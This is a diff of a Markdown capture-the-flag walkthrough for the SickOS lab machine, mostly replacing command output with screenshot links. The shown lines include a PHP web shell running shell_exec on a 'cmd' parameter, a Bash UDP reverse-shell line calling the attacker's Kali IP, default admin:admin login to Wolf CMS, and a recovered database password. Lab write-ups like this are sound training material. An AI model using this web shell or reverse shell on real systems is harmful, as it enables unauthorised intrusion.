@@ -6,31 +6,21 @@
 
 # 1. Nmap
 - **We could not find the IP address for the box using ‘nmap -sn’ or ‘-Pn’ scan. But using sudo it is possible to scan for the box.**
-  ```
-  (kali@kali)-[~] $ nmap -sn 192.168.56.0/24 
-  Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 15:14 ESTIU 
-  Nmap scan report for (192.168.56.1) Host is up (0.00024s latency). 
-  Nmap scan report for 192.168.56.3 cm Host is up (0.00013s latency). Nmap done: 256 IP addresses (2 hosts up) scanned in 2.97 seconds
-  ```
-  > 192.168.56.11 is identified as SickOS. (.1 is the host machine, .2 is the VirtualBox router (https://router-network.com/ip/192-168-56-2), and .3 is Kali.)
+  
+  ![img](https://i.ibb.co/kQQvVtZ/Screenshot-2.png)
+  
+ - 192.168.56.11 is identified as SickOS. (.1 is the host machine, .2 is the VirtualBox router (https://router-network.com/ip/192-168-56-2), and .3 is Kali.)
 
 - **Using ‘nmap -sV’ we can see the running services. Squid proxy on Port 3128 seems promising, so let's look into that.**
 
-  ```
-  (kali@kali) - [~] $ sudo nmap -sV 192.168.56.11 
-  Starting Nmap 7.91 ( https://nmap.org) at 2022-02-19 15:51 EST 
-  Nmap scan report for 192.168.56.11 Host is up (0.00031s latency) 
-  Not shown: 997 filtered ports PORT STATE SERVICE VERSION 
-  22/tcp open ssh OpenSSH 5.9p1 Debian Subuntul.1 (Ubuntu Linux; protocol 2.0) 
-  3128/tcp open http proxy Squid http proxy 3.1.19 
-  8080/tcp closed http-proxy MAC Address: 08:00:27:AB:F1:24 (Oracle VirtualBox virtual NIC) Service Info: 05: Linux; CPE: cpe:/o:linux:linux kernel
-  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
-  ```
+  ![img](https://i.ibb.co/3Mcqm8c/Screenshot-3.png)
+  
 -----------------------------------------
 
 # 2. Proxy
 - FoxyProxy is a Firefox extension which automatically switches an internet connection across one or more proxy servers based on URL patterns; put simply, FoxyProxy automates the manual process of editing Firefox's Connection Settings dialog.
-Let’s use the extension to connect to the Squid http proxy by entering in the box’s IP address and Port 3128. We are able to connect to the proxy server without any type of authentication. Then we’re able to access the running web service, which is just a blank page with text.
+
+- Let’s use the extension to connect to the Squid http proxy by entering in the box’s IP address and Port 3128. We are able to connect to the proxy server without any type of authentication. Then we’re able to access the running web service, which is just a blank page with text.
 
 
   ![img](https://i.ibb.co/xMzxv0t/Screenshot-2.png)
@@ -48,12 +38,12 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
 (Wolf CMS Documentation: https://wolf-cms.readthedocs.io/en/latest/getting-started/installation/)
 
   ![img](https://i.ibb.co/pWqgzGN/Screenshot-3.png)
-  > http://192.168.56.11/wolfcms/config (CODE:200|SIZE:403)
+  > ![img](https://i.ibb.co/cN1T01W/Screenshot-5.png)
 
 -----------------------------------------
 
 # 4. Wolf CMS Login
-- Regarding from the Wolf CMS’s documentation, we find ‘wolfcms/?/admin/login’ which is the admin login panel. Using the default credentials admin:admin, we can access the CMS as admin. Click around a bit (to understand how the CMS works) and you will find a page that allows file uploading.
+- Also from the Wolf CMS’s documentation, we find ‘wolfcms/?/admin/login’ which is the admin login panel. Using the default credentials admin:admin, we can access the CMS as admin. Click around a bit (to understand how the CMS works) and you will find a page that allows file uploading.
 
 
   ![img](https://i.ibb.co/BT31Mx2/Screenshot-1.png)
@@ -67,10 +57,12 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
   <?php if (isset($_GET['cmd'])) { print(shell_exec($_GET['cmd'])); }
   ```
 - In this PHP script, we set a function which checks if a variable is specified and not ‘NULL’ in a HTTP GET request. Then the ‘shell_exec’ function will execute commands via a shell, after a variable is specified (cmd); commands are positioned after cmd=. The php script executes and displays the results on the web page.
+  > ![img](https://i.ibb.co/BV2MZ3b/Screenshot-2.png)
+ 
+ 
+- This would execute commands on the server's backend that allow us to run commands on the box. For example, you can try cmd=pwd and it will return the current file path. (Note: We are still connected through the proxy.) 
 
-  ![img](https://i.ibb.co/BV2MZ3b/Screenshot-2.png)
-  > This would execute commands on the server's backend that allow us to run commands on the box. For example, you can try cmd=pwd and it will return the current file path. (Note: We are still connected through the proxy.) ![img](https://i.ibb.co/7V9DLTg/Screenshot-1.png)
-
+  ![img](https://i.ibb.co/7V9DLTg/Screenshot-1.png)
 - However, you will soon find out that the current user does not have admin/sudo privileges. 
 - Back under the Files tab, it seems we can change file permissions!
 
@@ -85,7 +77,7 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
   sh -i >& /dev/udp/192.168.56.3/1337 0>&1
   ```
   
-  > This Bash UDP Reverse shell payload can be found on https://github.com/swisskyrepo/PayloadsAllTheThings
+  > This Bash UDP Reverse shell payload can be found on https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp
 
 - We will edit our reverse shell payload by editing the IP Address to ours along with the specified port and change our malicious file permissions to 0777.
 
@@ -108,62 +100,16 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
 
 - Remember the config.php file earlier (refer to Step #3)? Let’s use ‘find / -name config.php’ (sudo find is not necessary here) to find it.
 
-  ```
-  find: /proc/1432/task/14327fd: 
-  Permission denied find: /proc/1432/task/1432/fdinfo': 
-  Permission denie find: /proc/1432/task/14327ns': 
-  Permission denied find: /proc/1432/fd': 
-  Permission denied find: /proc/1432/map files': 
-  Permission denied find: /proc/1432/fdinfo': 
-  Permission denied find: /proc/1432/ns': 
-  Permission denied find: "/root': 
-  Permission denied find: /etc/chatscripts': 
-  Permission denied find: /etc/ssl/private': 
-  Permission denied find: /etc/ppp/peers: 
-  Permission denied find: /home/sickos/.cache': 
-  Permission denied find: /home/tylenol/.cache: 
-  Permission denied find: /var/lib/sudo': 
-  Permission denied find: /var/lib/php5': 
-  Permission denied find: /var/lib/mysql': 
-  Permission denied find: /var/log/mysql: 
-  Permission denied find: /var/log/apache2': 
-  Permission denied find: /var/spool/cron/atspool': 
-  Permission denied find: /var/spool/cron/crontabs': 
-  Permission denied find: /var/spool/cron/atjobs': 
-  Permission denied find: /var/cache/ldconfig': 
-  Permission denied /var/www/wolfcms/config.php find: 7 lost+found': Permission denied
-  ```
-    > `Permission denied /var/www/wolfcms/config.php find: 7 lost+found': Permission denied`
+  ![img](https://i.ibb.co/D5jysjh/Screenshot-6.png)
+  
 - Now let’s ‘cd’ to it. And using ‘ls’ we see the config.php file listed.
-  ```
-  $ cd /var/www/wolfcms 
-  $ ls 
-  CONTRIBUTING.md 
-  README.md 
-  composer.json 
-  config.php 
-  docs 
-  favicon.ico 
-  index.php 
-  public 
-  robots.txt 
-  wolf
-  ```
+
+  ![img](https://i.ibb.co/nDws2PZ/Screenshot-7.png)
+
  - Now let’s ‘cat’ the file to see if there’s anything useful.
-    ```
-    $ cat config.php 
-    <?php
-    // Database information: I 
-    // for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
-    // The path can only be absolute path or memory: 
-    // For more info look at: www.php.net/pdo
-    // Database settings: 
-    define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); 
-    define('DB USER', 'root'); 
-    define('DB PASS', 'john@123'); 
-    define('TABLE_PREFIX', '');
-    ```
-      > root:john@123 looks good.
+
+  ![img](https://i.ibb.co/gWZfgqf/Screenshot-8.png)
+
 -----------------------------------------
  # 8. Logging In 
   
